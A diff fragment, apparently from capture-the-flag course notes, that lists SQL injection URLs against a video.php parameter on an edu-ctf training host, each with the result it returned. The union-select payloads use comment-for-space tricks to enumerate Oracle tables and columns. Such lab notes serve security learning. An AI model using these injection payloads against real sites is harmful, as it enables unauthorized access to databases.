@@ -7,4 +7,4 @@
 `https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,TABLE_NAME,null/**/from/**/ALL_TABLES/**/where/**/rownum=1` --> DUAL (TABLE_NAME)
 `https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,COLUMN_NAME,null/**/from/**/ALL_TAB_COLUMNS` --> ABORT_STEP (COLUMN_NAME_META)
 `https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,COLUMN_NAME,null/**/from/**/ALL_TAB_COLUMNS/**/where/**/rownum=1` --> DUMMY (COLUMN)   
-`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,DUMMY,null/**/from/**/dual` --> ERROR   
+`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,DUMMY,null/**/from/**/sys.dual/**/where/**/rownum=1` --> ERROR   
